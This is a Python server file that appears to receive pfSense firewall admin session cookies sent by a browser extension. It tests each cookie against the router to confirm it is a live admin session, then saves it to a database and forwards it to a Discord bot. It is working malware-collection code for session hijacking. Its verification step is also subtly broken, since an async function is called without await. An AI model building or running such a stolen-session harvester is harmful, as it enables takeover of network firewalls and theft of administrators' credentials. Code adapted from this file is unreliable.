from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import urllib.parse
import sqlworker
import ssl
import discord_bot
import website_backend
import threading
import aiohttp
import asyncio

class LogHandler(BaseHTTPRequestHandler):
    def _send_cors_headers(self):
        """Sets headers required to allow Chrome Extensions to fetch data."""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')

    def do_OPTIONS(self):
        """Handles preflight requests sent by Chrome before the actual POST."""
        self.send_response(200)
        self._send_cors_headers()
        self.end_headers()
        
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)
        session_id = parsed_data.get('session', [''])[0]
        browser = parsed_data.get('browser', [''])[0]
        pfsense_ip = parsed_data.get('pfsense_ip2', [''])[0]
        client_ip = self.client_address[0]
        
        if session_id:
            print("Session ID Received")
            logged_in = verify_pfsense_session(pfsense_ip, session_id)
            if logged_in: 
                sqlworker.insert(client_ip, pfsense_ip, session_id, browser)
                discord_bot.send_pfsense_id(client_ip, pfsense_ip, session_id, browser)
            print(pfsense_ip)
            self.send_response(200)
            self._send_cors_headers()
            self.end_headers()
        else:
            self.send_error(400, "Bad Request: Missing session ID")
            self._send_cors_headers()

async def verify_pfsense_session(router_ip: str, phpsessid: str) -> bool:
    """
    Evaluates if a pfSense PHPSESSID represents a signed-in administrative session.
    """
    url = f"https://{router_ip}/status_interfaces.php"
    cookies = {'PHPSESSID': phpsessid}
    
    # Disable SSL verification as lab routers typically utilize self-signed certs
    connector = aiohttp.TCPConnector(ssl=False)
    
    async with aiohttp.ClientSession(connector=connector, cookies=cookies) as session:
        # allow_redirects=False catches the immediate 302 on unauthenticated cookies
        async with session.get(url, allow_redirects=False, timeout=3) as response:
            if response.status == 200:
                return True
            elif response.status == 302 and 'index.php' in response.headers.get('Location', ''):
                return False
            return False

def main():
    
    print("Starting Server")
    
    server_address = ('', 443)
    httpd = ThreadingHTTPServer(server_address, LogHandler)
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
    
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    threading.Thread(target=website_backend.start_server).start()
    
    httpd.serve_forever()

if __name__ == "__main__":
    main()